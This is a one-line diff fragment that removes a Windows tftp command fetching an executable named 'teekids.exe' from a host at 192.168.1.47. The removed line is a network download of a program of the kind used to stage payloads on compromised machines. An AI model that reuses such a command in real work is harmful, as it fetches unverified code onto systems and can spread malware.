@@ -1,1 +1,0 @@
-tftp -i 192.168.1.47 GET teekids.exe
